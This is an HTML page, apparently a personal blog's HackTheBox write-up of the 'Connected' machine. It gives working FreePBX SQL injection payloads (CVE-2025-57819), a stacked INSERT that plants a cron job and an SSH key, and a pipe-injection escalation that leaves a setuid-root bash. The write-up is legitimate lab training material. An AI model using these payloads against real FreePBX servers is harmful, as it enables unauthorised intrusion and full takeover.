@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Connected — FreePBX SQLi to Root via an incron Hook That Forgot About the Pipe</title>
+<style>
+  * { box-sizing: border-box; }
+  html { background-color: #0a0e27; }
+  body {
+    background-color: rgba(10, 14, 39, 0.9);
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.easy {
+    background: rgba(102,217,239,0.2);
+    color: #66d9ef;
+    border-color: #66d9ef;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  .flag-redacted {
+    color: #888;
+    font-style: italic;
+  }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Connected — FreePBX SQLi to Root via an incron Hook That Forgot About the Pipe</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag easy">EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">FREEPBX</span>
+  <span class="tag">SQL INJECTION</span>
+  <span class="tag">INCRON</span>
+  <span class="tag">CVE-2025-57819</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Connected is an Easy-rated Linux box that front-loads a clean,
+well-documented foothold — a preauth SQL injection in FreePBX's endpoint
+module (CVE-2025-57819) — and then hides its real teeth in privilege
+escalation. The foothold took minutes. Root took discipline: three
+plausible, almost-working FreePBX privesc paths each failed for a
+<em>different</em> boring reason, and the one that worked hinged on a single
+character that a root-owned "sanitizer" forgot to blacklist. This writeup
+spends most of its length on the privesc, because that's where the box
+actually lives.</p>
+
+<h2>&gt; RECON</h2>
+
+<pre>nmap -p- -sC -sV --min-rate 5000 &lt;target&gt;</pre>
+
+<table>
+  <tr><th>Port</th><th>Service</th></tr>
+  <tr><td>22</td><td>OpenSSH 7.4</td></tr>
+  <tr><td>80</td><td>Apache 2.4.6 (CentOS) — redirect to connected.htb</td></tr>
+  <tr><td>443</td><td>Apache + PHP 7.4.16 — TLS cert CN <code>pbxconnect</code>, redirect to <code>/admin</code></td></tr>
+</table>
+
+<p>The anomaly is the path, as always. A CentOS/PHP-7.4 host whose TLS cert
+is issued to <code>pbxconnect</code> and whose web root bounces to <code>/admin</code> is
+a <strong>FreePBX</strong> PBX. The admin footer gives the exact version —
+<code>FreePBX 16.0.40.7</code> — which is squarely inside the window for the
+2025 unauthenticated endpoint-module SQL injection.</p>
+
+<h2>&gt; FOOTHOLD — CVE-2025-57819 (PREAUTH SQLi &rarr; CRON RCE)</h2>
+
+<p>The <code>endpoint</code> module's <code>ajax.php</code> is reachable without
+authentication and passes its <code>brand</code> parameter into SQL with no
+sanitization. A single quote is all it takes to confirm:</p>
+
+<pre>curl -sk "https://&lt;target&gt;/admin/ajax.php?module=FreePBX\modules\endpoint\ajax\
+&command=model&template=x&model=model&brand=x'"
+# ...1064 You have an error in your SQL syntax... near 'x' AND (`key` LIKE 'model%' ...</pre>
+
+<p>The <code>brand</code> value actually feeds <em>two</em> different queries with
+different column counts, so UNION fights you. Error-based extraction is the
+path of least resistance — bearing in mind <code>extractvalue()</code> truncates
+output at 32 characters, so long values come out in halves:</p>
+
+<pre>&hellip;&brand=x' AND extractvalue(1,concat(0x7e,(SELECT group_concat(username,0x3a,password_sha1) FROM ampusers)))-- -
+# ~admin:<span class="flag-redacted">[SHA1 redacted]</span>   (and, annoyingly, NOT in rockyou)</pre>
+
+<div class="callout">
+The admin hash doesn't crack and the DB user holds only <code>USAGE</code> (no
+<code>FILE</code> privilege, so no <code>INTO OUTFILE</code> webshell). The intended RCE is
+cleaner than either: FreePBX stores its own scheduled tasks in a
+<code>cron_jobs</code> table, and its scheduler runs them as the <code>asterisk</code>
+user every minute. A <strong>stacked</strong> injection inserts our own job.
+</div>
+
+<pre>&hellip;&brand=x';INSERT INTO cron_jobs
+ (modulename,jobname,command,class,schedule,max_runtime,enabled,execution_order)
+ VALUES ('x','x','&lt;COMMAND&gt;',NULL,'* * * * *',30,1,1)-- -</pre>
+
+<p>This is exactly what Metasploit's
+<code>exploit/unix/http/freepbx_unauth_sqli_to_rce</code> automates (its success
+marker is the odd error <em>"Trying to access array offset on value of type
+bool"</em>, which means the INSERT landed). Rather than a Meterpreter reverse
+shell, the command here just plants an SSH key — because of a local quirk
+worth calling out:</p>
+
+<div class="callout warn">
+The attack host runs <code>ufw</code> with default-deny on inbound. A reverse shell
+or Metasploit fetch-stager is a connection <em>back</em> to the attacker — i.e.
+inbound to our box — and dies at our own firewall with no root to open the
+port. So we flip direction: the cron command drops our public key into
+<code>asterisk</code>'s <code>authorized_keys</code>, and we connect <em>outbound</em> over SSH.
+Outbound to <code>target:22</code> is never blocked.
+</div>
+
+<pre># &lt;COMMAND&gt; the cron runs as asterisk:
+for h in /home/asterisk /var/lib/asterisk; do mkdir -p $h/.ssh; \
+  echo '&lt;OUR_PUBKEY&gt;' &gt;&gt; $h/.ssh/authorized_keys; done
+
+# ~60s later:
+ssh -i id_con asterisk@&lt;target&gt;
+asterisk@connected$ cat /home/asterisk/user.txt
+<span class="flag-redacted">[user flag captured ✅]</span></pre>
+
+<p><code>/etc/freepbx.conf</code> hands over the app DB credentials
+(<code>freepbxuser</code>) for free once you're on the box — useful in a moment.</p>
+
+<h2>&gt; PRIVESC — THREE DEAD ENDS FIRST</h2>
+
+<p><code>asterisk</code> owns the <em>entire</em> FreePBX install — <code>/var/www/html</code>,
+<code>/var/lib/asterisk/bin/fwconsole</code>, even <code>/etc/freepbx.conf</code>. That
+screams "get root to run FreePBX code." Three natural attempts, three
+different failures:</p>
+
+<ul>
+  <li><b>Root fwconsole via config poisoning.</b> Any root execution of
+  <code>fwconsole</code> would load our attacker-owned <code>/etc/freepbx.conf</code>. A
+  uid-0-gated payload was planted and waited on — but the only root
+  invocation is <code>freepbx.service</code> at boot (a oneshot), which isn't
+  triggerable. Dead.</li>
+  <li><b>sysadmin cron-injection.</b> A root-run incron handler,
+  <code>sysadmin_update_set_cron</code>, builds root's crontab from DB values we
+  control — a textbook newline-injection. Except the script
+  <code>include_once('DB.php')</code> and PEAR's DB package isn't installed, so it
+  fatals before doing anything. Dead.</li>
+  <li><b>sysadmin OpenVPN command injection.</b> <code>sysadmin_openvpn</code> runs
+  <code>route add &hellip; gw &lt;vpn_ip&gt;</code> with an unsanitized license field — but it
+  requires a valid ionCube license that doesn't exist on an offline lab box.
+  Dead.</li>
+</ul>
+
+<div class="callout">
+PwnKit (CVE-2021-4034) was also a no-go: <code>polkit-0.112-26.el7_9.1</code> is
+the patched build. When enumeration stalls, stop guessing and <em>watch</em>:
+a tight <code>ps</code>-spy loop from the foothold catches short-lived root cron /
+incron children and localhost daemons.
+<pre>for i in $(seq 1 100); do ps -eo user,ppid,pid,cmd --no-headers; sleep 0.6; done</pre>
+That surfaced <code>incrond</code> (root) and a root <code>aiohttp</code> service on
+<code>127.0.0.1:4000</code> (<code>aiovega</code>). The latter was a red herring — it's a
+proxy to remote Vega hardware with no local subprocess. <code>incrond</code> was the
+real path.
+</div>
+
+<h2>&gt; ROOT — THE incron HOOK THAT FORGOT ABOUT THE PIPE</h2>
+
+<p>FreePBX ships <code>/etc/incron.d/*</code> tables. One watches an
+<strong>asterisk-writable</strong> directory and runs a dispatcher as root on any
+file event:</p>
+
+<pre>/var/spool/asterisk/incron  IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE  /usr/bin/sysadmin_manager $#</pre>
+
+<p>(Cheap liveness proof: drop a file in that directory and watch root delete
+it within seconds.) <code>sysadmin_manager</code> parses the trigger filename as
+<code>module.hook.params</code>, GPG-verifies the module's <code>module.sig</code> and the
+hook's hash — so we can't forge or modify hooks — and then sanitizes the
+params before running them:</p>
+
+<pre>// out-of-spec / non-ASCII chars rejected
+if (preg_match('/[^\x20-\x7e]/', $params)) exit;
+// "extra double sanity check"
+if (preg_match('/[`\'"$&gt;&lt;&amp;;]/', $params)) exit;
+...
+system("$hookfile $params");   // ← runs as ROOT</pre>
+
+<div class="callout warn">
+Look closely at that blacklist: <code>`</code> <code>'</code> <code>"</code> <code>$</code> <code>&gt;</code>
+<code>&lt;</code> <code>&amp;</code> <code>;</code> — every classic shell metacharacter <em>except the
+pipe</em>. <code>|</code> sails straight through. And since <code>system()</code> runs the
+whole string through <code>/bin/sh</code>, a pipe lets us feed a legitimately-signed
+hook's output into any command we like, as root.
+</div>
+
+<p>The lever is the <code>filestore/addpubkey</code> hook — a plaintext, validly-signed
+PHP script that simply appends its argument to <code>/root/.ssh/authorized_keys</code>.
+We don't even care what it does; we only need it as the left-hand side of a
+pipe. The <code>.CONTENTS</code> filename form lets the payload live in the file
+<em>body</em>, so the <code>/</code> and <code>|</code> characters never have to appear in the
+filename:</p>
+
+<pre># trigger file name:
+/var/spool/asterisk/incron/filestore.addpubkey.CONTENTS
+# its contents (= the root-sanitized but pipe-friendly params):
+x | install -m 4755 /bin/bash /var/tmp/.dcsh</pre>
+
+<p><code>install -m 4755</code> copies <code>bash</code> and sets the setuid bit in one shot.
+<code>/var/tmp</code> lives on the root <code>xfs</code> filesystem (not <code>nosuid</code>, unlike
+<code>/tmp</code> and <code>/dev/shm</code>), so the setuid bit sticks:</p>
+
+<pre>asterisk@connected$ printf 'x | install -m 4755 /bin/bash /var/tmp/.dcsh' \
+  &gt; /var/spool/asterisk/incron/filestore.addpubkey.CONTENTS
+asterisk@connected$ ls -l /var/tmp/.dcsh
+-rwsr-xr-x 1 root root 964536 /var/tmp/.dcsh
+
+asterisk@connected$ /var/tmp/.dcsh -p -c 'id; cat /root/root.txt'
+uid=999(asterisk) gid=1000(asterisk) euid=0(root) groups=1000(asterisk)
+<span class="flag-redacted">[root flag captured ✅]</span></pre>
+
+<h2>&gt; ATTACK CHAIN SUMMARY</h2>
+
+<ol>
+  <li>TLS cert <code>pbxconnect</code> + <code>/admin</code> redirect fingerprints FreePBX 16.0.40.7</li>
+  <li>Unauthenticated SQL injection in the endpoint module's <code>ajax.php</code> <code>brand</code> parameter (CVE-2025-57819); confirmed and looted error-based</li>
+  <li>Stacked-query <code>INSERT INTO cron_jobs</code> plants a task the FreePBX scheduler runs as <code>asterisk</code> every minute</li>
+  <li>That task drops our SSH key (reverse shells blocked by our own egress firewall) → SSH in as <code>asterisk</code></li>
+  <li>Root-owned <code>incrond</code> runs <code>sysadmin_manager</code> on events in an asterisk-writable spool directory</li>
+  <li><code>sysadmin_manager</code>'s param blacklist misses <code>|</code>; a signed <code>filestore/addpubkey</code> hook is piped into <code>install -m 4755</code> to drop a setuid-root <code>bash</code></li>
+  <li><code>/var/tmp/.dcsh -p</code> → <code>euid=0</code> → root</li>
+</ol>
+
+<h2>&gt; LESSONS LEARNED</h2>
+
+<ul>
+  <li>Fingerprint the <em>exact</em> product and version before anything else — <code>pbxconnect</code> on the cert plus a PHP footer version string is the whole foothold, handed over for free.</li>
+  <li>When inbound callbacks die at your own firewall, invert the direction: have the target's execution primitive install an SSH key, then connect <em>outbound</em>. Outbound to <code>:22</code> is almost always permitted.</li>
+  <li>A "dead" primitive is still a map. The broken PEAR-dependent cron script pointed directly at the incron dispatcher that actually worked — read the whole mechanism before discarding it.</li>
+  <li>When privesc enumeration stalls, spy the process table. A short <code>ps</code> loop catches root cron/incron children and localhost daemons that a static look misses — and lets you separate the real trigger from red herrings like a root localhost proxy with no local subprocess.</li>
+  <li>A character-<em>blacklist</em> sanitizer wrapped around a <code>system()</code> string is defeated by a single missed shell-active byte. Here it was <code>|</code>. A signed-hook allowlist is only ever as safe as the least-careful hook it permits.</li>
+  <li><code>install -m 4755 /bin/bash &lt;dir&gt;/x</code> is a tidy one-shot setuid drop when you have a single arbitrary root command — just avoid <code>nosuid</code> mounts (<code>/tmp</code>, <code>/dev/shm</code>) and land it on the root filesystem.</li>
+</ul>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+    <!-- Matrix Rain Effect — full-page backdrop behind all content -->
+    <canvas id="matrix-rain"></canvas>
+    <script>
+        // Full-width Matrix rain rendered as a fixed backdrop across the whole
+        // page. z-index:-1 + pointer-events:none keep it strictly BEHIND the
+        // content so it never runs over text, tags, code blocks or images.
+        (function () {
+            const canvas = document.getElementById('matrix-rain');
+            const ctx = canvas.getContext('2d');
+
+            canvas.style.position = 'fixed';
+            canvas.style.top = '0';
+            canvas.style.left = '0';
+            canvas.style.zIndex = '-1';
+            canvas.style.pointerEvents = 'none';
+            canvas.style.opacity = '0.4';
+
+            const matrixChars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ01234567890@#$%^&*()';
+            const fontSize = 16;
+            let drops = [];
+
+            function initColumns() {
+                const columns = Math.floor(canvas.width / fontSize);
+                drops = [];
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.random() * -100;
+                }
+            }
+
+            function resize() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                initColumns();
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(10, 14, 39, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#00ff88';
+                ctx.font = fontSize + 'px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            resize();
+            setInterval(draw, 50);
+            window.addEventListener('resize', resize);
+        })();
+    </script>
+
+</body>
+</html>
